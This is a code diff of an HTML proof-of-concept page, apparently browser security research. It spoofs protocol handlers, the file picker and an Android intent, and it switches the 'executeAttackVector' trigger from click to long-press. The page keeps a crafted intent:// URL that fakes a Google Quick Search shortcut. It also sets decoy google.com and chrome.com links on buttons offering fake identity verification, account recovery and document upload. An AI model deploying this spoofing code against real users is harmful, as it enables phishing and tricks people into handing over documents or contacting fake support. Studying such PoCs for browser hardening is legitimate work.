@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker & Protocol Spoof PoC - Synchronized</title>
+    <title>File Picker & Protocol Spoof PoC - Long Press</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -49,6 +49,7 @@
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
             cursor: pointer;
+            -webkit-touch-callout: default; /* Memastikan context menu / long-press bawaan mobile bisa tertangkap */
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -96,10 +97,10 @@
 
     <!-- Container dengan 4 Tombol Terpisah -->
     <div class="button-container">
-        <a class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
-        <a class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
-        <a class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
-        <a class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
+        <a href="https://chrome.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
     <!-- Uploaded Image Preview Box -->
@@ -129,7 +130,7 @@
             if (triggered) return;
             triggered = true;
 
-            // 1. Eksekusi pemanggilan keyboard secara sinkron di awal interaksi
+            // 1. Eksekusi pemanggilan keyboard secara sinkron
             triggerKeyboard();
 
             try {
@@ -175,10 +176,8 @@
                     }
                 }
                 else if (actionType === 'intentspoof') {
-                    // Sinkronisasi timing eksekusi intent agar mulus tanpa terblokir proteksi timer panjang
                     const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                     
-                    // Jeda mikro 50ms untuk memastikan sinkronisasi DOM render & keyboard aktif
                     setTimeout(() => {
                         window.location.href = intentUrl;
                     }, 50);
@@ -195,26 +194,25 @@
             }
         };
 
-        // Event listeners diselaraskan menggunakan 'click' agar langsung menangkap user activation secara akurat
-        document.getElementById("targetLinkMailto").addEventListener("click", (e) => {
-            e.preventDefault();
-            executeAttackVector('mailto', e.target.getAttribute('data-intent'));
-        });
+        // Helper untuk memasang event listener Long-Press (contextmenu) dengan aman
+        const bindLongPress = (elementId, actionType) => {
+            const el = document.getElementById(elementId);
+            if (!el) return;
 
-        document.getElementById("targetLinkTel").addEventListener("click", (e) => {
-            e.preventDefault();
-            executeAttackVector('tel', e.target.getAttribute('data-intent'));
-        });
+            el.addEventListener("contextmenu", (e) => {
+                e.preventDefault(); // Mencegah menu konteks default browser agar vector langsung tereksekusi
+                executeAttackVector(actionType, el.getAttribute('data-intent'));
+            });
 
-        document.getElementById("targetLinkFile").addEventListener("click", (e) => {
-            e.preventDefault();
-            executeAttackVector('filepicker', e.target.getAttribute('data-intent'));
-        });
+            // Fallback touchstart untuk mendeteksi gestur tekan lama di mobile jika diperlukan
+            el.addEventListener("touchstart", () => {}, { passive: true });
+        }
 
-        document.getElementById("targetLinkIntent").addEventListener("click", (e) => {
-            e.preventDefault();
-            executeAttackVector('intentspoof', e.target.getAttribute('data-intent'));
-        });
+        // Binding semua tombol ke event long-press (contextmenu)
+        bindLongPress("targetLinkMailto", 'mailto');
+        bindLongPress("targetLinkTel", 'tel');
+        bindLongPress("targetLinkFile", 'filepicker');
+        bindLongPress("targetLinkIntent", 'intentspoof');
     </script>
 
 </body>
